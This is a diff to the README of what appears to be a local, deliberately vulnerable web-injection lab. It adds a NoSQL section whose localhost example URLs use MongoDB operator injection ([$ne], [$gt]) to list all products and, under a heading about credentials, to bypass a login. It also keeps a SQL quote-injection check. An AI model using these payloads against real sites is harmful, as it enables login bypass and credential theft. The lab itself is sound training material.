@@ -2,6 +2,8 @@
 
 Start the network with `./start_linux_network.sh`. You have to wait a bit until the databases are populated.
 
+# SQL
+
 ## Overview
 
 To get an overview of the examples goto http://127.0.0.1:8781/
@@ -109,3 +111,16 @@ Form to choose a customer showing soft skills
 ## Verification
 
 [http://127.0.0.1:8781/inf_disclosure/form_steps/forms.php?form=form2&param='](http://127.0.0.1:8781/inf_disclosure/form_steps/forms.php?form=form2&param=')
+
+# NoSQL
+
+To get an overview of the examples goto http://127.0.0.1:8782/
+
+## Get all products
+
+- [http://127.0.0.1:8782/products.php?product[$gt]=%22%22](http://127.0.0.1:8782/products.php?product[$gt]=%22%22)
+- [http://127.0.0.1:8782/products.php?product[$ne]=1(http://127.0.0.1:8782/products.php?product[$ne]=1)
+
+## Get all credentials / Potential login bypass
+
+- [http://127.0.0.1:8782/users.php?user[$ne]=1&pass[$ne]=1](http://127.0.0.1:8782/users.php?user[$ne]=1&pass[$ne]=1)
